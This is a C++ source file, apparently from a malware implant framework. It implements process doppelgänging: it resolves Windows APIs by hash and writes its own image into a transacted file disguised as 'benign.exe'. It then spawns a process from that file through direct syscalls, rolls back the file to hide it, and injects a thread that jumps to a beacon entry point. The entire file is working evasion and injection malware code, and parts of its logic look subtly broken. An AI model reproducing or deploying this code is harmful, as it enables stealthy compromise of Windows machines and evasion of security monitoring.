#include "Doppel.h"
#include "ApiHash.h"
#include "NtTypes.h"
#include "Syscalls.h"
#include "core/Beacon.h"

#include <windows.h>

#include <cstdio>
#include <cstring>

namespace doppel {

namespace {

void* r(const char* dll, const char* fn) {
    return api::export_by_hash(API_HASH(dll), API_HASH(fn));
}

typedef HANDLE (WINAPI* CreateTransaction_t)(LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
typedef HANDLE (WINAPI* CreateFileTransactedW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, void*, void*, ULONG);
typedef BOOL (WINAPI* CommitTransaction_t)(HANDLE);
typedef BOOL (WINAPI* RollbackTransaction_t)(HANDLE);
typedef BOOL (WINAPI* CloseHandle_t)(HANDLE);

bool write_implant_to_transacted_file(HANDLE hFile) {
    // Read the current EXE image from memory and write it into the transacted file.
    auto peb = reinterpret_cast<void**>(__readgsqword(0x60));
    void* base = peb ? peb[2] : nullptr;
    if (!base) return false;
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<std::uint8_t*>(base) + dos->e_lfanew);
    std::size_t sz = nt->OptionalHeader.SizeOfImage;
    DWORD wn = 0;
    return WriteFile(hFile, base, static_cast<DWORD>(sz), &wn, nullptr) && wn == sz;
}

} // namespace

bool run() {
    auto ct = reinterpret_cast<CreateTransaction_t>(r("ktmw32.dll", "CreateTransaction"));
    auto cft = reinterpret_cast<CreateFileTransactedW_t>(r("kernel32.dll", "CreateFileTransactedW"));
    auto rt = reinterpret_cast<RollbackTransaction_t>(r("ktmw32.dll", "RollbackTransaction"));
    auto ch = reinterpret_cast<CloseHandle_t>(r("kernel32.dll", "CloseHandle"));
    if (!ct || !cft || !rt || !ch) return false;

    HANDLE txn = ct(nullptr, nullptr, 0, 0, 0, 0, nullptr);
    if (txn == INVALID_HANDLE_VALUE) return false;

    HANDLE hFile = cft(L"C:\\Windows\\Temp\\benign.exe",
                       GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, nullptr, txn, nullptr, 0);
    if (hFile == INVALID_HANDLE_VALUE) { rt(txn); ch(txn); return false; }

    if (!write_implant_to_transacted_file(hFile)) { ch(hFile); rt(txn); ch(txn); return false; }

    // Create a section from the transacted file and a process from it.
    HANDLE hSection = nullptr;
    LARGE_INTEGER sz{};
    if (syscalls::ScCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &sz,
        PAGE_READONLY, SEC_IMAGE, hFile) < 0) {
        ch(hFile); rt(txn); ch(txn); return false;
    }

    HANDLE hProcess = nullptr;
    nt::ObjectAttributes oa{};
    nt::init_object(oa, nullptr);
    if (syscalls::ScCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, &oa, (HANDLE)-1,
        0, hSection, nullptr, nullptr, 0) < 0) {
        ch(hSection); ch(hFile); rt(txn); ch(txn); return false;
    }

    // Rollback transaction so the on-disk file is reverted to empty/invalid.
    rt(txn);
    ch(hFile);
    ch(hSection);
    ch(txn);

    // Remote thread into a trampoline that jumps to beacon::run.
    std::size_t n = 4096;
    void* remote = nullptr;
    syscalls::ScAllocVm(hProcess, &remote, 0, &n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote) {
        // mov rax, imm64; jmp rax
        unsigned char stub[16] = {
            0x48, 0xB8, 0,0,0,0,0,0,0,0, // mov rax, imm64
            0xFF, 0xE0                    // jmp rax
        };
        std::uintptr_t ep = reinterpret_cast<std::uintptr_t>(&beacon::run);
        std::memcpy(stub + 2, &ep, 8);
        std::size_t wn = 0;
        syscalls::ScWriteVm(hProcess, remote, stub, sizeof(stub), &wn);
        std::uint32_t old = 0;
        syscalls::ScProtectVm(hProcess, &remote, &n, PAGE_EXECUTE_READ, &old);
        HANDLE hThread = nullptr;
        syscalls::ScCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProcess,
                                   remote, nullptr, FALSE, 0, 0, 0, nullptr);
        if (hThread) syscalls::ScClose(hThread);
    }
    syscalls::ScClose(hProcess);
    ExitProcess(0);
    return true;
}

} // namespace doppel
